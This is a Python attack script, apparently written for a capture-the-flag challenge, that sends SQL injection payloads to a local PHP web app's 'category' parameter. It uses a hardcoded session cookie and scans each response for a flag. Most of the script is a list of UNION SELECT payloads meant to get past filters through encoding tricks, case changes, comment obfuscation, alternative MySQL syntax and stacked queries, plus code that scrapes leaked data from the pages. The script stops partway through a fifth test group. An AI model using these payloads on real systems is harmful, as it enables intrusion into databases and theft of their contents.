import requests
import urllib.parse
import time
import re

# Target setup
target = "http://127.0.0.1:32780/"
session_cookie = "PHPSESSID=a619c2d322b0d2025997d9751eb6d09a"
headers = {"Cookie": session_cookie}

print("=" * 80)
print("ADVANCED SQL INJECTION BYPASS TECHNIQUES")
print("=" * 80)

def test_payload(payload, description):
    print(f"\n[+] {description}")
    url_encoded = urllib.parse.quote(payload, safe='')
    url = f"{target}?category={url_encoded}"
    
    try:
        response = requests.get(url, headers=headers, timeout=10)
        
        # Check for flag
        flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
        if flag_match:
            print(f"[!!!] FLAG FOUND: {flag_match.group()}")
            print("\nFull response:")
            print(response.text)
            exit()
        
        # Check if injection worked by looking for non-default content
        if len(response.text) > 1500 or len(response.text) < 1340:
            print(f"[!] SIZE ANOMALY: {len(response.text)} bytes (baseline: ~1345)")
            
            # Extract visible data
            content = re.findall(r'>([^<]{10,200})<', response.text)
            real_data = [c for c in content if not any(skip in c.lower() for skip in ['notice', 'undefined', 'variable', 'html', 'php', 'br /', 'option value', 'choose a'])]
            
            if real_data:
                print(f"[!] EXTRACTED DATA: {real_data[:5]}")
                return {'success': True, 'data': real_data}
        
        # Check for SQL errors with data
        if 'SQL syntax' in response.text or 'mysql' in response.text.lower():
            print(f"[-] SQL Error detected (blocked)")
        
        return {'success': False, 'size': len(response.text)}
        
    except Exception as e:
        print(f"[!] Error: {e}")
        return {'error': str(e)}

# Test 1: Character encoding variations
print("\n" + "=" * 80)
print("TEST 1: Character Encoding Variations")
print("=" * 80)

encoding_tests = [
    # Double URL encoding
    {"payload": "%2527%20UNION%20SELECT%201,2,3,4,5%20FROM%20information_schema.tables--", "desc": "Double URL encoded quote"},
    
    # Unicode encoding
    {"payload": "%u0027%20UNION%20SELECT%201,2,3,4,5%20FROM%20information_schema.tables--", "desc": "Unicode encoded quote"},
    
    # HTML entity encoding (might decode before SQL)
    {"payload": "&#x27;%20UNION%20SELECT%201,2,3,4,5%20FROM%20information_schema.tables--", "desc": "HTML entity quote"},
    
    # Mixed encoding
    {"payload": "%27%20%55NION%20%53ELECT%201,2,3,4,5%20FROM%20information_schema.tables--", "desc": "Hex encoded UNION/SELECT"},
    
    # Case variations
    {"payload": "%27%20UnIoN%20SeLeCt%201,2,3,4,5%20FrOm%20information_schema.tables--", "desc": "Random case UNION SELECT"},
    
    # Alternative spaces
    {"payload": "%27%20UNION%28SELECT%201,2,3,4,5%20FROM%20information_schema.tables%29--", "desc": "Parentheses instead of space"},
]

for test in encoding_tests:
    test_payload(test["payload"], test["desc"])
    time.sleep(0.2)

# Test 2: Comment-based obfuscation
print("\n" + "=" * 80)
print("TEST 2: Comment-based Obfuscation")
print("=" * 80)

comment_tests = [
    {"payload": "%27%20UNION/**/SELECT/**/1,2,3,4,5/**/FROM/**/information_schema.tables--", "desc": "/**/ comments"},
    {"payload": "%27%20UNION%23%0aSELECT%23%0a1,2,3,4,5%23%0aFROM%23%0ainformation_schema.tables--", "desc": "Hash newline comments"},
    {"payload": "%27%20UNION%2f%2a%0a%2a%2fSELECT%2f%2a%0a%2a%2f1,2,3,4,5%2f%2a%0a%2a%2fFROM%2f%2a%0a%2a%2finformation_schema.tables--", "desc": "Multiline comments with newlines"},
    {"payload": "%27%20UNION%2f%2afoobar%2a%2fSELECT%2f%2afoobar%2a%2f1,2,3,4,5%2f%2afoobar%2a%2fFROM%2f%2afoobar%2a%2finformation_schema.tables--", "desc": "Comments with text"},
]

for test in comment_tests:
    test_payload(test["payload"], test["desc"])
    time.sleep(0.2)

# Test 3: Alternative syntax
print("\n" + "=" * 80)
print("TEST 3: Alternative MySQL Syntax")
print("=" * 80)

syntax_tests = [
    {"payload": "%27%20UNION%20ALL%20SELECT%201,2,3,4,5%20FROM%20information_schema.tables--", "desc": "UNION ALL instead of UNION"},
    {"payload": "%27%20UNION%20DISTINCT%20SELECT%201,2,3,4,5%20FROM%20information_schema.tables--", "desc": "UNION DISTINCT"},
    {"payload": "%27%20UNION%20SELECT%201,2,3,4,5%20FROM%60information_schema%60.%60tables%60--", "desc": "Backtick table names"},
    {"payload": "%27%20UNION%20SELECT%201,2,3,4,5%20FROM%20information_schema.tables%20WHERE%20true--", "desc": "Add WHERE true"},
    {"payload": "%27%20UNION%20SELECT%401,2,3,4,5%20FROM%20information_schema.tables--", "desc": "Variable @ at start"},
]

for test in syntax_tests:
    test_payload(test["payload"], test["desc"])
    time.sleep(0.2)

# Test 4: Stacked queries (if supported)
print("\n" + "=" * 80)
print("TEST 4: Stacked Query Attempts")
print("=" * 80)

stacked_tests = [
    {"payload": "%27%3bSELECT%201,2,3,4,5%20FROM%20information_schema.tables--", "desc": "Semicolon stack"},
    {"payload": "%27%3b%20UNION%20SELECT%201,2,3,4,5%20FROM%20information_schema.tables--", "desc": "Semicolon with UNION"},
]

for test in stacked_tests:
    test_payload(test["payload"], test["desc"])
    time.sleep(0.2)

# Test 5: Inline view and subquery variations
print("\n" + "=" * 80)
